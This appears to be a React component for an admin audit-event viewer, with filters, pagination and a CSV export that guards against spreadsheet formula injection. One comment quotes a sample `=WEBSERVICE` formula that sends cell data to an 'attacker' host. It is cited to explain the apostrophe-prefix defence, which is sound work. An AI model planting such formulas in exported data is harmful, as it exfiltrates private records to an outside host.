import { useState, useEffect, useCallback, useMemo, useRef } from 'react';
import { useSearchParams } from 'react-router-dom';
import {
  FiShield, FiFilter, FiRefreshCw, FiChevronDown, FiChevronRight,
  FiAlertTriangle, FiAlertCircle, FiInfo, FiClock, FiUser, FiX,
  FiDownload, FiMaximize2, FiMinimize2,
} from 'react-icons/fi';
import { useApiFetch } from '../../../hooks/useApiFetch';
import { ACTION_OPTIONS, ACTION_LABEL } from '../lib/auditActions';
import { summarizeAuditEvent } from '../lib/auditSummary';
import '../styles/audit-events.css';

const SEVERITY_OPTIONS = [
  { value: '',         label: 'Todas' },
  { value: 'info',     label: 'Info' },
  { value: 'warning',  label: 'Advertencia' },
  { value: 'critical', label: 'Crítico' },
];

const SEVERITY_META = {
  info:     { Icon: FiInfo,           label: 'Info' },
  warning:  { Icon: FiAlertTriangle,  label: 'Advertencia' },
  critical: { Icon: FiAlertCircle,    label: 'Crítico' },
};

const SEVERITY_BADGE_VARIANT = {
  info:     'aur-badge--blue',
  warning:  'aur-badge--yellow',
  critical: 'aur-badge--magenta',
};

const LIMIT_OPTIONS = [50, 100, 250, 500];

// Estilos inline del status region — invisible para ojos, audible para
// lectores. Evita agregar una utility class global a aurora.css solo para
// este componente.
const SR_ONLY = {
  position: 'absolute',
  width: '1px',
  height: '1px',
  padding: 0,
  margin: '-1px',
  overflow: 'hidden',
  clip: 'rect(0 0 0 0)',
  whiteSpace: 'nowrap',
  border: 0,
};

function formatTimestamp(iso) {
  if (!iso) return '—';
  const d = new Date(iso);
  // toLocaleString no tira con fechas inválidas, devuelve "Invalid Date";
  // el try/catch viejo nunca corría. Chequeamos isNaN explícito y caemos al
  // valor crudo si el backend mandó algo no parseable.
  if (Number.isNaN(d.getTime())) return String(iso);
  return d.toLocaleString('es-CR', {
    day: '2-digit', month: 'short', year: 'numeric',
    hour: '2-digit', minute: '2-digit',
  });
}

// Tiempo relativo "hace X" — primario en el card, complementa al absoluto
// que va en title. Para eventos viejos (>1 semana) devolvemos '' y el render
// cae al absoluto, así no decimos cosas como "hace 47 d" que no aportan.
function formatRelativeTime(iso) {
  if (!iso) return '';
  const d = new Date(iso);
  if (Number.isNaN(d.getTime())) return '';
  const diff = (Date.now() - d.getTime()) / 1000;
  if (diff < 0)      return ''; // futuro: caer al absoluto, no diagnosticar
  if (diff < 30)     return 'ahora';
  if (diff < 60)     return `hace ${Math.floor(diff)} s`;
  if (diff < 3600)   return `hace ${Math.floor(diff / 60)} min`;
  if (diff < 86400)  return `hace ${Math.floor(diff / 3600)} h`;
  if (diff < 604800) return `hace ${Math.floor(diff / 86400)} d`;
  return '';
}

// Convierte un <input type="date"> (YYYY-MM-DD) al borde local del día en ISO
// con offset. Antes mandábamos el string crudo y el backend lo parseaba como
// UTC midnight, lo que en Costa Rica (UTC-6) corría el rango 6h y hacía que
// eventos del día anterior aparecieran en "Desde X" y eventos del día actual
// se perdieran en "Hasta X". El backend acepta ISO directo vía new Date().
function dayStartIso(yyyyMmDd) {
  if (!yyyyMmDd) return '';
  const [y, m, d] = yyyyMmDd.split('-').map(Number);
  if (!y || !m || !d) return '';
  return new Date(y, m - 1, d, 0, 0, 0, 0).toISOString();
}
function dayEndIso(yyyyMmDd) {
  if (!yyyyMmDd) return '';
  const [y, m, d] = yyyyMmDd.split('-').map(Number);
  if (!y || !m || !d) return '';
  return new Date(y, m - 1, d, 23, 59, 59, 999).toISOString();
}

// Para mostrar un target "humano" preferimos un label del metadata por sobre
// el doc ID crudo de Firestore. Si el backend grabó el email/nombre, mejor
// "user: juan@aurora.com" que "user: aBc123XyZ". Cae al id si no hay label.
function humanLabelFromMetadata(m) {
  if (!m || typeof m !== 'object') return null;
  return m.email
      || m.nombreLote
      || m.nombreComercial
      || m.loteNombre
      || m.nombreGrupo
      || m.proveedor
      || m.encargadoNombre
      || m.buyerName
      || (m.consecutivo ? `#${m.consecutivo}` : null)
      || null;
}

function formatTarget(target, metadata) {
  if (!target || typeof target !== 'object') return null;
  const { type, id } = target;
  if (!type && !id) return null;
  const label = humanLabelFromMetadata(metadata) || id;
  return `${type || 'obj'}: ${label || '—'}`;
}

// CSV-escape con BOM para que Excel reconozca UTF-8 y acentos se vean bien.
// Además, prefijamos con apóstrofe las celdas que arrancan con caracteres que
// Excel/Sheets interpretan como inicio de fórmula (=, +, -, @, TAB, CR). El
// metadata de auditoría captura datos parcialmente controlados por usuarios
// externos (userAgent en token.rejected, vendor names en prompt_injection,
// emails), así que un valor tipo `=WEBSERVICE("http://attacker/?x="&A2)` podría
// exfiltrar audit data al abrir el CSV. El apóstrofe lo neutraliza sin perder
// el contenido — Excel lo muestra como texto literal.
function csvEscape(v) {
  if (v == null) return '';
  let s = String(v);
  if (/^[=+\-@\t\r]/.test(s)) s = "'" + s;
  if (/[",\n\r]/.test(s)) return `"${s.replace(/"/g, '""')}"`;
  return s;
}
function exportEventsAsCsv(events) {
  const headers = [
    'timestamp', 'severity', 'action',
    'actorEmail', 'actorUid', 'actorRole',
    'targetType', 'targetId', 'metadata',
  ];
  const rows = events.map(ev => [
    ev.timestamp,
    ev.severity,
    ev.action,
    ev.actorEmail,
    ev.actorUid,
    ev.actorRole,
    ev.target?.type,
    ev.target?.id,
    JSON.stringify(ev.metadata || {}),
  ].map(csvEscape).join(','));
  // BOM (U+FEFF) para que Excel detecte UTF-8 y los acentos / ñ se vean bien
  // al abrir el CSV; sin él, Excel asume latin1 y los caracteres se rompen.
  const csv = '﻿' + [headers.join(','), ...rows].join('\r\n');
  const blob = new Blob([csv], { type: 'text/csv;charset=utf-8' });
  const url = URL.createObjectURL(blob);
  const a = document.createElement('a');
  a.href = url;
  const now = new Date();
  const stamp = `${now.getFullYear()}${String(now.getMonth() + 1).padStart(2, '0')}${String(now.getDate()).padStart(2, '0')}`
              + `-${String(now.getHours()).padStart(2, '0')}${String(now.getMinutes()).padStart(2, '0')}`;
  a.download = `audit-events-${stamp}.csv`;
  document.body.appendChild(a);
  a.click();
  document.body.removeChild(a);
  URL.revokeObjectURL(url);
}

function MetadataRow({ metadata }) {
  const entries = metadata && typeof metadata === 'object' ? Object.entries(metadata) : [];
  if (entries.length === 0) {
    return <div className="audit-meta-empty">Sin metadatos adicionales.</div>;
  }
  return (
    <dl className="audit-meta-grid">
      {entries.map(([k, v]) => (
        <div key={k} className="audit-meta-item">
          <dt>{k}</dt>
          <dd>
            {typeof v === 'object'
              ? <pre>{JSON.stringify(v, null, 2)}</pre>
              : String(v)}
          </dd>
        </div>
      ))}
    </dl>
  );
}

function AuditEvents() {
  const apiFetch = useApiFetch();

  // ── URL state ────────────────────────────────────────────────────────────
  // Los filtros viven en la URL para poder compartir/recuperar una vista
  // ("mirá este rango de eventos") y para que un /audit-events?event=X abra
  // el evento expandido. setSearchParams con replace para no llenar el
  // historial cada vez que el usuario toca un select.
  const [searchParams, setSearchParams] = useSearchParams();
  const filterAction   = searchParams.get('action')   || '';
  const filterSeverity = searchParams.get('severity') || '';
  const filterSince    = searchParams.get('since')    || '';
  const filterUntil    = searchParams.get('until')    || '';
  const limitRaw       = Number(searchParams.get('limit'));
  const limit          = Number.isFinite(limitRaw) && limitRaw > 0 ? limitRaw : 100;
  const eventAnchor    = searchParams.get('event') || '';

  const updateParam = useCallback((key, value) => {
    setSearchParams(prev => {
      const next = new URLSearchParams(prev);
      if (value === '' || value == null) next.delete(key);
      else next.set(key, String(value));
      return next;
    }, { replace: true });
  }, [setSearchParams]);

  const resetFilters = useCallback(() => {
    setSearchParams(prev => {
      const next = new URLSearchParams(prev);
      ['action', 'severity', 'since', 'until', 'limit'].forEach(k => next.delete(k));
      return next;
    }, { replace: true });
  }, [setSearchParams]);

  // ── Datos + paginación ────────────────────────────────────────────────────
  // `events` acumula a medida que el usuario hace "Cargar más" dentro del mismo
  // queryString. Cambios de filtro reemplazan la lista (primera página); el
  // botón de carga adicional appendea con cursor `after`. La paginación es por
  // cursor de timestamp (no offset) porque audit_events solo se consulta
  // orderBy timestamp desc, así que el último item de la página es el cursor.
  const [events, setEvents] = useState([]);
  const [loading, setLoading] = useState(true);
  const [loadingMore, setLoadingMore] = useState(false);
  const [hasMore, setHasMore] = useState(false);
  // null | 'forbidden' | 'index_required' | 'generic'. Persistente (a diferencia
  // de un toast que se va solo): un fallo de carga no debe disfrazarse de "no
  // hay eventos". `index_required` se distingue para guiar al admin / dev.
  const [error, setError] = useState(null);
  const [expanded, setExpanded] = useState(() => new Set());

  // queryString incluye los filtros pero NO el cursor `after` (el cursor se
  // agrega en cada request porque cambia entre página 1 y "Cargar más" sin que
  // cambien los filtros). Los date inputs se convierten a ISO con offset local
  // para que el rango respete el día del usuario, no el día UTC del servidor.
  const queryString = useMemo(() => {
    const params = new URLSearchParams();
    if (filterAction)   params.set('action', filterAction);
    if (filterSeverity) params.set('severity', filterSeverity);
    if (filterSince)    params.set('since', dayStartIso(filterSince));
    if (filterUntil)    params.set('until', dayEndIso(filterUntil));
    params.set('limit', String(limit));
    return params.toString();
  }, [filterAction, filterSeverity, filterSince, filterUntil, limit]);

  // Con los filtros montados durante el refetch, dos cambios rápidos disparan
  // requests concurrentes. Sin abort en el fetch wrapper, descartamos por
  // secuencia: solo la respuesta de la última request emitida toca el estado,
  // así no renderizamos resultados que no corresponden al filtro activo.
  const reqSeq = useRef(0);

  const requestPage = useCallback(({ cursor, cursorId, append }) => {
    const seq = ++reqSeq.current;
    if (append) setLoadingMore(true); else setLoading(true);

    const params = new URLSearchParams(queryString);
    // Cursor compuesto: timestamp + docId. Solo-timestamp pierde eventos
    // adyacentes cuando dos comparten el mismo milisegundo (raro pero real:
    // batch writes, cron). El backend usa el docId para romper el empate vía
    // DocumentSnapshot.startAfter.
    if (cursor) params.set('after', cursor);
    if (cursorId) params.set('afterId', cursorId);

    apiFetch(`/api/audit/events?${params.toString()}`)
      .then(async r => {
        if (r.status === 403) throw new Error('forbidden');
        if (!r.ok) {
          // Parseo defensivo del body para diferenciar INDEX_REQUIRED del 500
          // genérico — sin esto, ambos caen al mismo error y el dev pierde la
          // pista del índice faltante.
          let code = null;
          try { code = (await r.json())?.code || null; } catch {}
          throw new Error(code === 'INDEX_REQUIRED' ? 'index_required' : 'fetch_failed');
        }
        return r.json();
      })
      .then(data => {
        if (seq !== reqSeq.current) return;
        const page = Array.isArray(data) ? data : [];
        setEvents(prev => (append ? [...prev, ...page] : page));
        // En first-page (reemplazo) podamos `expanded` a los ids que siguen
        // visibles. En append (loadMore) mantenemos los expand previos: el
        // usuario podría haber expandido en la página 1 y seguir leyendo.
        if (!append) {
          setExpanded(prev => {
            const visible = new Set(page.map(e => e.id));
            return new Set([...prev].filter(id => visible.has(id)));
          });
        }
        // Si la respuesta llenó la página, asumimos que puede haber más.
        // Si vino corta, no hay más eventos hacia atrás bajo estos filtros.
        setHasMore(page.length >= limit);
        setError(null);
      })
      .catch(err => {
        if (seq !== reqSeq.current) return;
        const map = { forbidden: 'forbidden', index_required: 'index_required' };
        setError(map[err.message] || 'generic');
        if (!append) setEvents([]);
        setHasMore(false);
      })
      .finally(() => {
        if (seq !== reqSeq.current) return;
        if (append) setLoadingMore(false); else setLoading(false);
      });
  }, [apiFetch, queryString, limit]);

  const fetchEvents = useCallback(() => requestPage({ cursor: null, cursorId: null, append: false }), [requestPage]);
  const loadMore = useCallback(() => {
    // El cursor es el (timestamp, id) del último evento ya cargado. El id rompe
    // empates cuando dos eventos comparten timestamp al milisegundo.
    const last = events[events.length - 1];
    if (!last?.timestamp || !last?.id) return;
    requestPage({ cursor: last.timestamp, cursorId: last.id, append: true });
  }, [events, requestPage]);

  useEffect(() => { fetchEvents(); }, [fetchEvents]);

  // ── Anchor por ?event=<id> ───────────────────────────────────────────────
  // Cuando se llega vía link con event=X y ese evento está en la página
  // cargada, lo expandimos y hacemos scroll. La clase is-anchor dispara un
  // pulso CSS para ayudar a localizarlo. Solo corre cuando cambia el anchor
  // o llega data nueva — no en cada render.
  useEffect(() => {
    if (!eventAnchor) return;
    if (!events.some(e => e.id === eventAnchor)) return;
    setExpanded(prev => prev.has(eventAnchor) ? prev : new Set(prev).add(eventAnchor));
    // requestAnimationFrame para esperar al pintado del expandido antes de
    // scrollear, así no salta a una posición que cambia.
    requestAnimationFrame(() => {
      document.getElementById(`audit-event-${eventAnchor}`)
        ?.scrollIntoView({ block: 'center', behavior: 'smooth' });
    });
  }, [eventAnchor, events]);

  // ── Triage por severidad ──────────────────────────────────────────────────
  // Conteo desde los eventos cargados (no consulta al backend). Es honesto
  // sobre el scope: el chip dice cuántos críticos hay EN PANTALLA, no en todo
  // el rango. Para una pregunta global ("¿hubo críticos esta semana?"), el
  // admin afina el filtro de fecha.
  const severityCounts = useMemo(() => {
    const c = { info: 0, warning: 0, critical: 0 };
    for (const ev of events) {
      const s = ev.severity in c ? ev.severity : 'info';
      c[s]++;
    }
    return c;
  }, [events]);

  const toggleExpand = (id) => setExpanded(prev => {
    const next = new Set(prev);
    next.has(id) ? next.delete(id) : next.add(id);
    return next;
  });
  const expandAll   = () => setExpanded(new Set(events.map(e => e.id)));
  const collapseAll = () => setExpanded(new Set());

  // Notifica al backend que un admin exfiltró el log antes de generar el CSV.
  // El backend escribe un evento `audit.export` con los filtros activos y el
  // conteo de filas. Best-effort: si la red falla o el backend rechaza, el CSV
  // igual se descarga — no bloqueamos UX por audit observability, que es
  // fail-open en todo el sistema. El `await` con catch silencioso permite
  // serializar la llamada antes del download sin propagar errores al usuario.
  const handleExport = useCallback(async () => {
    try {
      await apiFetch('/api/audit/exports', {
        method: 'POST',
        body: JSON.stringify({
          count: events.length,
          filters: {
            action: filterAction || null,
            severity: filterSeverity || null,
            since: filterSince ? dayStartIso(filterSince) : null,
            until: filterUntil ? dayEndIso(filterUntil) : null,
          },
        }),
      });
    } catch {
      // Best-effort. Audit fail-open por diseño.
    }
    exportEventsAsCsv(events);
  }, [apiFetch, events, filterAction, filterSeverity, filterSince, filterUntil]);

  // hasFilters NO incluye el límite: cambiar el límite no filtra, solo dice
  // cuántos mostrar. Antes contaba como filtro y disparaba el mensaje "Ningún
  // evento coincide con los filtros" cuando lo único distinto del default era
  // el tamaño de página.
  const hasFilters = !!(filterAction || filterSeverity || filterSince || filterUntil);

  // ── A11y: status string para lectores de pantalla ─────────────────────────
  // Anuncia carga / resultado / error sin gritar cada evento individual.
  let liveStatus = '';
  if (loading && events.length === 0) liveStatus = 'Cargando eventos de auditoría…';
  else if (error === 'forbidden')     liveStatus = 'Sin permisos para ver el registro.';
  else if (error === 'index_required') liveStatus = 'Combinación de filtros no soportada por el índice actual.';
  else if (error)                     liveStatus = 'Error al cargar el registro.';
  else if (events.length === 0)       liveStatus = hasFilters ? 'Ningún evento coincide con los filtros.' : 'No hay eventos registrados.';
  else                                liveStatus = `${events.length} ${events.length === 1 ? 'evento cargado' : 'eventos cargados'}.`;

  // ── Body de la sección Eventos ────────────────────────────────────────────
  // Prioridad: error > carga inicial > vacíos > lista. Mientras hay un refetch
  // con datos viejos NO mostramos el spinner de carga inicial — atenuamos la
  // lista vieja (.is-refetching) así no se pierde contexto al cambiar filtro.
  const renderEventsBody = () => {
    if (error) {
      const forbidden = error === 'forbidden';
      const indexRequired = error === 'index_required';
      // forbidden: no retry — el rol no cambia reintentando. index_required:
      // retry tampoco va a resolver hasta que se desplieguen los índices, pero
      // lo dejamos por si el admin lo está corriendo después de un deploy.
      return (
        <div className="audit-error" role="alert">
          {forbidden ? <FiShield size={36} /> : <FiAlertCircle size={36} />}
          <p>
            {forbidden
              ? 'Solo los administradores pueden ver el registro de auditoría.'
              : indexRequired
                ? 'Esta combinación de filtros necesita un índice que aún no está desplegado.'
                : 'No se pudo cargar el registro de auditoría.'}
          </p>
          <p className="audit-error-hint">
            {forbidden
              ? 'Tu cuenta no tiene el rol necesario. Si creés que es un error, contactá a un administrador.'
              : indexRequired
                ? 'Probá una combinación de filtros más simple (solo acción, o solo severidad), o avisá al equipo: el link para crear el índice está en los logs de Cloud Functions.'
                : 'Puede ser un problema de conexión o del servidor. Volvé a intentar.'}
          </p>
          {!forbidden && (
            <button
              type="button"
              className="aur-btn-pill aur-btn-pill--sm"
              onClick={fetchEvents}
              disabled={loading}
            >
              <FiRefreshCw size={13} className={loading ? 'audit-spin' : ''} /> Reintentar
            </button>
          )}
        </div>
      );
    }

    if (loading && events.length === 0) {
      return <div className="aur-page-loading" />;
    }

    if (events.length === 0) {
      return hasFilters ? (
        <p className="audit-no-matches">Ningún evento coincide con los filtros.</p>
      ) : (
        <div className="audit-empty">
          <FiShield size={36} />
          <p>No hay eventos registrados todavía.</p>
          <p className="audit-empty-hint">
            Acá aparecen los eventos forenses: cambios de rol y accesos, creaciones
            y eliminaciones, ajustes de stock, planilla pagada, cédulas de aplicación,
            recepciones de compra, decisiones de autopilot y alertas de seguridad.
          </p>
        </div>
      );
    }

    return (
      <>
        <div className={`audit-list-wrap${loading ? ' is-refetching' : ''}`} aria-busy={loading}>
          <ul className="audit-event-list">
            {events.map(ev => {
              const sev = SEVERITY_META[ev.severity] || SEVERITY_META.info;
              const SevIcon = sev.Icon;
              const isOpen = expanded.has(ev.id);
              const isAnchor = ev.id === eventAnchor;
              const actionLabel = ACTION_LABEL[ev.action] || ev.action;
              const targetStr = formatTarget(ev.target, ev.metadata);
              const badgeVariant = SEVERITY_BADGE_VARIANT[ev.severity] || 'aur-badge--gray';
              const summary = summarizeAuditEvent(ev);
              const relative = formatRelativeTime(ev.timestamp);
              const absolute = formatTimestamp(ev.timestamp);
              const bodyId = `audit-event-body-${ev.id}`;

              return (
                <li
                  key={ev.id}
                  id={`audit-event-${ev.id}`}
                  className={`audit-event audit-event--${ev.severity || 'info'}${isAnchor ? ' is-anchor' : ''}`}
                >
                  <button
                    type="button"
                    className="audit-event-header"
                    onClick={() => toggleExpand(ev.id)}
                    aria-expanded={isOpen}
                    aria-controls={bodyId}
                  >
                    <span className={`aur-badge ${badgeVariant}`} title={sev.label}>
                      <SevIcon size={11} /> {sev.label}
                    </span>
                    {/* Relativo primario, absoluto en title — para escanear
                        recencia en una lista densa sin perder el dato exacto. */}
                    <span className="audit-event-time" title={absolute}>
                      <FiClock size={12} />
                      {relative || absolute}
                    </span>
                    <span className="audit-event-action">{actionLabel}</span>
                    <span className="audit-event-actor">
                      <FiUser size={12} />
                      {ev.actorEmail || ev.actorUid || 'sistema'}
                      {ev.actorRole && <span className="audit-event-role">· {ev.actorRole}</span>}
                    </span>
                    {targetStr && <span className="audit-event-target">{targetStr}</span>}
                    <span className="audit-event-chevron">
                      {isOpen ? <FiChevronDown size={14} /> : <FiChevronRight size={14} />}
                    </span>
                  </button>
                  {summary && (
                    // Resumen "qué cambió" derivado del metadata por auditSummary.js.
                    // Si el renderer produjo solo nulls (metadata vacío), el :empty
                    // del CSS la oculta — así no queda un strip en blanco.
                    <div className="audit-event-summary">{summary}</div>
                  )}
                  {isOpen && (
                    <div className="audit-event-body" id={bodyId} role="region" aria-label={`Detalle: ${actionLabel}`}>
                      <MetadataRow metadata={ev.metadata} />
                      <div className="audit-event-ids">
                        <span>ID evento: <code>{ev.id}</code></span>
                        {ev.fincaId && <span>Finca: <code>{ev.fincaId}</code></span>}
                        {ev.actorUid && <span>UID: <code>{ev.actorUid}</code></span>}
                      </div>
                    </div>
                  )}
                </li>
              );
            })}
          </ul>
          {loading && <span className="audit-refetch-spinner" aria-hidden="true" />}
        </div>

        {hasMore && (
          <div className="audit-load-more">
            <button
              type="button"
              className="aur-btn-pill aur-btn-pill--sm"
              onClick={loadMore}
              disabled={loadingMore}
            >
              <FiRefreshCw size={13} className={loadingMore ? 'audit-spin' : ''} />
              {loadingMore ? 'Cargando…' : 'Cargar más'}
            </button>
          </div>
        )}
      </>
    );
  };

  const eventsCount = events.length;
  const canExport = !error && eventsCount > 0;
  const canExpandAll = !error && eventsCount > 0;
  const allExpanded = canExpandAll && expanded.size === eventsCount;

  return (
    <div className="aur-sheet">
      {/* Status region para lectores de pantalla: anuncia carga, errores y
          conteo sin obligar a aria-live sobre la lista (que sería ruidoso). */}
      <div role="status" aria-live="polite" style={SR_ONLY}>{liveStatus}</div>

      <header className="aur-sheet-header">
        <div className="aur-sheet-header-text">
          <h2 className="aur-sheet-title">Registro de auditoría</h2>
          <p className="aur-sheet-subtitle">
            Trazabilidad forense: usuarios y roles, eliminación de recursos, stock,
            planilla, cédulas de aplicación, compras, autopilot y señales de seguridad.
          </p>
        </div>
        <div className="aur-sheet-header-actions">
          <button
            type="button"
            className="aur-btn-pill aur-btn-pill--sm"
            onClick={handleExport}
            disabled={!canExport}
            title={canExport ? `Exportar ${eventsCount} eventos a CSV` : 'No hay eventos para exportar'}
          >
            <FiDownload size={13} /> Exportar CSV
          </button>
          <button
            type="button"
            className="aur-btn-pill aur-btn-pill--sm"
            onClick={fetchEvents}
            disabled={loading}
          >
            <FiRefreshCw size={13} className={loading ? 'audit-spin' : ''} />
            Actualizar
          </button>
        </div>
      </header>

      <section className="aur-section">
        <div className="aur-section-header">
          <h3>Filtros</h3>
          {hasFilters && (
            <div className="aur-section-actions">
              <button type="button" className="aur-chip aur-chip--ghost" onClick={resetFilters}>
                <FiX size={11} /> Limpiar
              </button>
            </div>
          )}
        </div>
        <div className="aur-list">
          <div className="aur-row">
            <label className="aur-row-label" htmlFor="audit-action">
              <FiFilter size={12} /> Acción
            </label>
            <select
              id="audit-action"
              className="aur-select"
              value={filterAction}
              onChange={e => updateParam('action', e.target.value)}
            >
              {ACTION_OPTIONS.map(o => (
                <option key={o.value} value={o.value}>{o.label}</option>
              ))}
            </select>
          </div>
          <div className="aur-row">
            <label className="aur-row-label" htmlFor="audit-severity">Severidad</label>
            <select
              id="audit-severity"
              className="aur-select"
              value={filterSeverity}
              onChange={e => updateParam('severity', e.target.value)}
            >
              {SEVERITY_OPTIONS.map(o => (
                <option key={o.value} value={o.value}>{o.label}</option>
              ))}
            </select>
          </div>
          <div className="aur-row">
            <label className="aur-row-label" htmlFor="audit-since">Desde</label>
            <input
              id="audit-since"
              type="date"
              className="aur-input"
              value={filterSince}
              max={filterUntil || undefined}
              onChange={e => updateParam('since', e.target.value)}
            />
          </div>
          <div className="aur-row">
            <label className="aur-row-label" htmlFor="audit-until">Hasta</label>
            <input
              id="audit-until"
              type="date"
              className="aur-input"
              value={filterUntil}
              min={filterSince || undefined}
              onChange={e => updateParam('until', e.target.value)}
            />
          </div>
          <div className="aur-row">
            <label className="aur-row-label" htmlFor="audit-limit">Tamaño de página</label>
            <select
              id="audit-limit"
              className="aur-select"
              value={limit}
              onChange={e => updateParam('limit', Number(e.target.value))}
            >
              {LIMIT_OPTIONS.map(n => (
                <option key={n} value={n}>{n}</option>
              ))}
            </select>
          </div>
        </div>
      </section>

      <section className="aur-section">
        <div className="aur-section-header">
          <h3>Eventos</h3>
          {!error && eventsCount > 0 && (
            // Chips clickables — conteo por severidad sobre lo cargado, y atajo
            // para filtrar al hacer click. El chip activo se realza vía .is-active.
            <div className="audit-severity-summary" aria-label="Conteo por severidad (en pantalla)">
              {['info', 'warning', 'critical'].map(s => {
                const count = severityCounts[s];
                const active = filterSeverity === s;
                return (
                  <button
                    key={s}
                    type="button"
                    className={`audit-severity-chip audit-severity-chip--${s}${active ? ' is-active' : ''}`}
                    onClick={() => updateParam('severity', active ? '' : s)}
                    disabled={count === 0 && !active}
                    title={`${SEVERITY_META[s].label}: ${count} en pantalla${active ? ' (filtro activo)' : ''}`}
                  >
                    {SEVERITY_META[s].label} · {count}
                  </button>
                );
              })}
            </div>
          )}
          {!error && eventsCount > 0 && (
            <div className="aur-section-actions">
              <button
                type="button"
                className="aur-chip aur-chip--ghost"
                onClick={allExpanded ? collapseAll : expandAll}
                title={allExpanded ? 'Colapsar todos' : 'Expandir todos'}
              >
                {allExpanded
                  ? <><FiMinimize2 size={11} /> Colapsar</>
                  : <><FiMaximize2 size={11} /> Expandir</>}
              </button>
            </div>
          )}
        </div>

        {renderEventsBody()}
      </section>
    </div>
  );
}

export default AuditEvents;
